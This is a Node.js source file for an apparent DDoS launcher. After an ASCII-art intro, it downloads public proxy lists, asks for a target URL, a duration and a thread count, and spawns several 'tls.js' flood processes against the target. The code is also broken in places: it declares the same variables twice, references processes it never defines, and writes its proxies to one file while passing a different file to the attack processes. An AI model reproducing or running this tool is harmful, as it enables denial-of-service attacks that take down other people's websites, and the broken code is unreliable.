const fs = require('fs');
const { spawn, exec } = require('child_process');
const https = require('https');
const Jimp = require('jimp');
const readline = require('readline');

const GIF_FILE = 'hoshino.gif';
const FRAME_DELAY = 15; // Smooth animation
const MAX_FRAMES = 20;
const ASCII_WIDTH = 85;
const ASCII_HEIGHT = 30;
const PROXY_FILE = 'aaaaa.txt';
const BLOCKS = ['█', '▓', '▒', '░', ' '];

// Function to clear screen
const clearScreen = () => process.stdout.write('\x1b[H\x1b[2J\x1b[3J');

// Extract GIF frames into PNG
async function extractGifFrames(gifPath) {
    if (!fs.existsSync('frames')) fs.mkdirSync('frames');

    return new Promise((resolve, reject) => {
        exec(`ffmpeg -i ${gifPath} -vf "fps=15,scale=${ASCII_WIDTH}:${ASCII_HEIGHT}" frames/frame%03d.png`, (err) => {
            if (err) return reject(err);
            resolve(fs.readdirSync('frames').filter(f => f.endsWith('.png')).slice(0, MAX_FRAMES));
        });
    });
}

// Convert image to ASCII
async function imageToAscii(imagePath) {
    const image = await Jimp.read(imagePath);
    image.resize(ASCII_WIDTH, ASCII_HEIGHT);

    let asciiImage = '';
    for (let y = 0; y < image.bitmap.height; y++) {
        let row = '';
        for (let x = 0; x < image.bitmap.width; x++) {
            const { r, g, b } = Jimp.intToRGBA(image.getPixelColor(x, y));
            const brightness = (r + g + b) / 3;
            const index = Math.floor((brightness / 255) * (BLOCKS.length - 1));
            const colorCode = `\x1b[48;2;${r};${g};${b}m`; // Background block color
            row += colorCode + BLOCKS[index];
        }
        asciiImage += row + '\x1b[0m\n';
    }
    return asciiImage;
}

// Preload frames
async function preloadAsciiFrames() {
    console.log("\x1b[1;36m[INFO]\x1b[0m Extracting and preloading frames...");
    const frames = await extractGifFrames(GIF_FILE);
    const asciiFrames = [];

    for (const frame of frames) {
        asciiFrames.push(await imageToAscii(`frames/${frame}`));
    }

    console.log("\x1b[1;32m[INFO]\x1b[0m Preloading complete.");
    return asciiFrames;
}

// Play animation
async function playAsciiAnimation(asciiFrames) {
    clearScreen();
    console.log("\x1b[1;36m[INFO]\x1b[0m Playing ASCII animation...\n");

    let frameIndex = 0;
    const interval = setInterval(() => {
        process.stdout.write('\x1b[H'); // Move cursor to top-left
        process.stdout.write(asciiFrames[frameIndex]); // Instant render
        frameIndex = (frameIndex + 1) % asciiFrames.length;
    }, FRAME_DELAY);

    return new Promise(resolve => setTimeout(() => {
        clearInterval(interval);
        clearScreen();
        resolve();
    }, 5000));
}

// Fetch IP
function fetchCurrentIP() {
    return new Promise((resolve) => {
        https.get('https://api64.ipify.org', (response) => {
            let data = '';
            response.on('data', (chunk) => data += chunk);
            response.on('end', () => resolve(data.trim()));
        }).on('error', () => resolve('Unknown'));
    });
}

// Download proxies
async function downloadProxies() {
    console.log("\x1b[1;33m[INFO]\x1b[0m Downloading fresh proxies...");

    if (fs.existsSync(PROXY_FILE)) fs.unlinkSync(PROXY_FILE);

    const PROXY_URLS = [
        'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000',
        'https://proxyelite.info/wp-admin/admin-ajax.php?action=proxylister_download&nonce=afb07d3ca5&format=txt'
    ];

    for (const url of PROXY_URLS) {
        await new Promise((resolve) => {
            const file = fs.createWriteStream(PROXY_FILE, { flags: 'a' });
            https.get(url, (response) => {
                response.pipe(file);
                file.on('finish', () => file.close(resolve));
            }).on('error', () => resolve());
        });
    }

    console.log("\x1b[1;32m[INFO]\x1b[0m Proxy list updated.");
}

// Console readline setup
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function askQuestion(question) {
    return new Promise(resolve => rl.question(`\x1b[1m${question}\x1b[0m `, resolve));
}

// Main function
async function main() {
    clearScreen();
    const asciiFrames = await preloadAsciiFrames();
    await playAsciiAnimation(asciiFrames);

    console.log("\n\x1b[1;36m======================================");
    console.log("             Mochi Mochi ><");
    console.log("======================================\x1b[0m\n");

    await downloadProxies();
    const ip = await fetchCurrentIP();
    console.log(`\x1b[1;35m[INFO]\x1b[0m Your current IP: \x1b[1;33m${ip}\x1b[0m`);

    const url = await askQuestion("\x1b[38;5;196mTarget URL:\x1b[0m ");
    const time = await askQuestion("\x1b[38;5;202mDuration (seconds):\x1b[0m ");
    const threads = await askQuestion("\x1b[38;5;214mNumber of Threads:\x1b[0m ");

    clearScreen();
    console.log("\n\x1b[1;36m======================================");
    console.log(`\x1b[38;5;196mTarget:\x1b[0m ${url}`);
    console.log(`\x1b[38;5;202mDuration:\x1b[0m ${time}s`);
    console.log(`\x1b[38;5;214mThreads:\x1b[0m ${threads}`);
    console.log(`\x1b[38;5;33mProxies:\x1b[0m ${PROXY_FILE}`);
    console.log("\x1b[1;36m======================================\x1b[0m\n");

    console.log("\x1b[1;32m[INFO]\x1b[0m Starting attack...\n");

    // Execute attack commands
    const attackProcess1 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
    const attackProcess2 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
    const attackProcess3 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
    const attackProcess4 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
    const attackProcess3 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
    const attackProcess4 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
    
    // Attach event listeners for each process
    attackProcess1.stdout.on('data', (data) => {
        console.log(`\x1b[1;36m[SYSTEM - Process 1]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess1.stderr.on('data', (data) => {
        console.error(`\x1b[1;31m[ERROR - Process 1]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess1.on('exit', (code) => {
        console.log(`\x1b[1;32m[INFO - Process 1]\x1b[0m Attack process exited with code ${code}`);
    });

    attackProcess2.stdout.on('data', (data) => {
        console.log(`\x1b[1;36m[SYSTEM - Process 2]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess2.stderr.on('data', (data) => {
        console.error(`\x1b[1;31m[ERROR - Process 2]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess2.on('exit', (code) => {
        console.log(`\x1b[1;32m[INFO - Process 2]\x1b[0m Attack process exited with code ${code}`);
    });

    attackProcess3.stdout.on('data', (data) => {
        console.log(`\x1b[1;36m[SYSTEM - Process 3]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess3.stderr.on('data', (data) => {
        console.error(`\x1b[1;31m[ERROR - Process 3]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess3.on('exit', (code) => {
        console.log(`\x1b[1;32m[INFO - Process 3]\x1b[0m Attack process exited with code ${code}`);
    });
    

    attackProcess4.stdout.on('data', (data) => {
        console.log(`\x1b[1;36m[SYSTEM - Process 4]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess4.stderr.on('data', (data) => {
        console.error(`\x1b[1;31m[ERROR - Process 4]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess4.on('exit', (code) => {
        console.log(`\x1b[1;32m[INFO - Process 4]\x1b[0m Attack process exited with code ${code}`);
    });

    attackProcess5.stdout.on('data', (data) => {
        console.log(`\x1b[1;36m[SYSTEM - Process5]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess5.stderr.on('data', (data) => {
        console.error(`\x1b[1;31m[ERROR - Process 5]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess5.on('exit', (code) => {
        console.log(`\x1b[1;32m[INFO - Process 5]\x1b[0m Attack process exited with code ${code}`);
    });
    

    attackProcess6.stdout.on('data', (data) => {
        console.log(`\x1b[1;36m[SYSTEM - Process6]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess6.stderr.on('data', (data) => {
        console.error(`\x1b[1;31m[ERROR - Process 6]\x1b[0m ${data.toString().trim()}`);
    });
    attackProcess6.on('exit', (code) => {
        console.log(`\x1b[1;32m[INFO - Process 6]\x1b[0m Attack process exited with code ${code}`);
    });


    
}

main();
